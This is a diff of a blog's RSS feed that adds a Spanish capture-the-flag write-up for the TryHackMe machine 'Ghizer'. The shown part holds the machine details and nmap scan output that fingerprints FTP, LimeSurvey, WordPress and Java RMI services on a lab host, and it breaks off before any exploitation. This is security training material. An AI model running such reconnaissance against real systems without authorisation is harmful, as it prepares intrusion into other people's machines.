@@ -12,7 +12,7 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>es</language>
     <copyright>©{year}, All Rights Reserved</copyright>
-    <lastBuildDate>Tue, 01 Sep 2020 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Mon, 07 Sep 2020 00:00:00 +0000</lastBuildDate>
     <sy:updatePeriod>daily</sy:updatePeriod>
     <sy:updateFrequency>daily</sy:updateFrequency>
     
@@ -21,6 +21,784 @@
     
     
 
+      
+      <item>
+        <title>TryHackMe - Ghizer</title>
+        <link>https://sckull.github.io/posts/ghizer/</link>
+        <pubDate>Mon, 07 Sep 2020 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Mon, 07 Sep 2020 00:00:00 +0000</atom:modified>
+        <guid>https://sckull.github.io/posts/ghizer/</guid>
+        <description>Ghizer es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
+        <content:encoded>&lt;p&gt;Ghizer es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;
+
+
+
+
+  
+
+
+
+  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
+    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/ghizer/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
+  &lt;/div&gt;
+
+&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Titulo&lt;/th&gt;
+&lt;th&gt;Ghizer&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Info&lt;/td&gt;
+&lt;td&gt;Lucrecia has installed multiple web applications on the server.&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Puntos&lt;/td&gt;
+&lt;td&gt;220&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Dificultad&lt;/td&gt;
+&lt;td&gt;Dificil&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Maker&lt;/td&gt;
+&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/stuxnet&#34;&gt;stuxnet&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
+&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80), ssl/https (443), servicio de java(?) (18002) y algunos otros puertos abiertos que no logramos obtener informacion.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;  1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 48
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 49
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 50
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 51
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 52
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 53
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 54
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 55
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 56
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 57
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 58
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 59
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 60
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 61
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 62
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 63
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 64
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 65
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 66
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 67
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 68
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 69
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 70
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 71
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 72
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 73
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 74
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 75
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 76
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 77
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 78
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 79
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 80
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 81
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 82
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 83
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 84
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 85
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 86
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 87
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 88
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 89
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 90
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 91
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 92
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 93
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 94
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 95
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 96
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 97
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 98
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 99
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;100
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;101
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;102
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;103
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;104
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;105
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;106
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;107
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;108
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;109
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;110
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;111
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;112
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;113
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;114
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;115
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;116
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;117
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;118
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;119
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;120
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;121
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;122
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;123
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;124
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;125
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;126
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;127
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting Nmap 7.80 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2020-09-04 18:24 EDT
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.26.105 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.26.105&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.31s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span class=&#34;m&#34;&gt;997&lt;/span&gt; closed ports
+PORT    STATE SERVICE  VERSION
+21/tcp  open  ftp?
+80/tcp  open  http     Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
+443/tcp open  ssl/http Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
+&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port21-TCP:V&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7.80%I&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7%D&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;9/4%Time&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;5F52BEA9%P&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;NULL,
+SF:33,&lt;span class=&#34;s2&#34;&gt;&amp;#34;220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\.0\.3\)\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;GenericLines,58,&lt;span class=&#34;s2&#34;&gt;&amp;#34;220\x20Welcome\x20to\x20Anonymous\x20FT
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:P\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\x20login\x20with\x2
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:0USER\x20and\x20PASS\.\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Help,58,&lt;span class=&#34;s2&#34;&gt;&amp;#34;220\x20Welcome\x20to\x20Anonymous
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\x20login\x20w
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:ith\x20USER\x20and\x20PASS\.\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;GetRequest,58,&lt;span class=&#34;s2&#34;&gt;&amp;#34;220\x20Welcome\x20to\
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\x
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:20login\x20with\x20USER\x20and\x20PASS\.\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HTTPOptions,58,&lt;span class=&#34;s2&#34;&gt;&amp;#34;220\x20W
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:elcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n53
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:0\x20Please\x20login\x20with\x20USER\x20and\x20PASS\.\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RTSPRequest
+SF:,58,&lt;span class=&#34;s2&#34;&gt;&amp;#34;220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x20
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:3\.0\.3\)\n530\x20Please\x20login\x20with\x20USER\x20and\x20PASS\.\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%
+SF:r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RPCCheck,33,&lt;span class=&#34;s2&#34;&gt;&amp;#34;220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:vsFTPd\x203\.0\.3\)\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;DNSVersionBindReqTCP,58,&lt;span class=&#34;s2&#34;&gt;&amp;#34;220\x20Welcome\x20to
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:x20login\x20with\x20USER\x20and\x20PASS\.\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;DNSStatusRequestTCP,58,
+SF:&lt;span class=&#34;s2&#34;&gt;&amp;#34;220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\.3\)\n530\x20Please\x20login\x20with\x20USER\x20and\x20PASS\.\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SS
+SF:LSessionReq,33,&lt;span class=&#34;s2&#34;&gt;&amp;#34;220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:(vsFTPd\x203\.0\.3\)\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;TerminalServerCookie,33,&lt;span class=&#34;s2&#34;&gt;&amp;#34;220\x20Welcome\x20t
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:o\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;TLSSessi
+SF:onReq,33,&lt;span class=&#34;s2&#34;&gt;&amp;#34;220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTP
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:d\x203\.0\.3\)\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Kerberos,33,&lt;span class=&#34;s2&#34;&gt;&amp;#34;220\x20Welcome\x20to\x20Anonymous\x20
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SMBProgNeg,33,&lt;span class=&#34;s2&#34;&gt;&amp;#34;220\x20Welc
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:ome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
+SF:X11Probe,58,&lt;span class=&#34;s2&#34;&gt;&amp;#34;220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vs
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:FTPd\x203\.0\.3\)\n530\x20Please\x20login\x20with\x20USER\x20and\x20PAS
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:S\.\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;FourOhFourRequest,58,&lt;span class=&#34;s2&#34;&gt;&amp;#34;220\x20Welcome\x20to\x20Anonymous\x20FT
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:P\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\x20login\x20with\x2
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:0USER\x20and\x20PASS\.\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 202.88 seconds
+
+Starting Nmap 7.80 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2020-09-04 18:25 EDT
+Warning: 10.10.26.105 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; ghizer.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.26.105&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.25s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span class=&#34;m&#34;&gt;64833&lt;/span&gt; closed ports, &lt;span class=&#34;m&#34;&gt;696&lt;/span&gt; filtered ports
+PORT      STATE SERVICE
+21/tcp    open  ftp
+80/tcp    open  http
+443/tcp   open  https
+18002/tcp open  unknown
+36625/tcp open  unknown
+45775/tcp open  unknown
+
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; ghizer.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.26.105&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.25s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+
+PORT      STATE  SERVICE  VERSION
+21/tcp    open   ftp?
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; fingerprint-strings: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest, X11Probe: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; Welcome to Anonymous FTP server &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Please login with USER and PASS.
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Kerberos, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    &lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; Welcome to Anonymous FTP server &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+80/tcp    open   http     Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-generator: LimeSurvey http://www.limesurvey.org
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.18 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title:         LimeSurvey    
+443/tcp   open   ssl/ssl  Apache httpd &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSL-only mode&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-generator: WordPress 5.4.2
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.18 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Ghizer &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#8211; Just another WordPress site&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssl-cert: Subject: &lt;span class=&#34;nv&#34;&gt;commonName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ubuntu
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Not valid before: 2020-07-23T17:27:31
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Not valid after:  2030-07-21T17:27:31
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: TLS randomness does not represent &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tls-alpn: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  http/1.1
+18002/tcp open   java-rmi Java RMI
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; rmi-dumpregistry: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   jmxrmi
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     javax.management.remote.rmi.RMIServerImpl_Stub
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     @127.0.1.1:33943
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     extends
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       java.rmi.server.RemoteStub
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       extends
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_        java.rmi.server.RemoteObject
+36625/tcp closed unknown
+45775/tcp closed unknown
+&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port21-TCP:V&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7.80%I&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7%D&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;8/14%Time&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;5F365C14%P&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;NULL
+SF:,33,&lt;span class=&#34;s2&#34;&gt;&amp;#34;220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x20
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:3\.0\.3\)\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;GenericLines,58,&lt;span class=&#34;s2&#34;&gt;&amp;#34;220\x20Welcome\x20to\x20Anonymous\x20F
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:TP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\x20login\x20with\x
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:20USER\x20and\x20PASS\.\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Help,58,&lt;span class=&#34;s2&#34;&gt;&amp;#34;220\x20Welcome\x20to\x20Anonymou
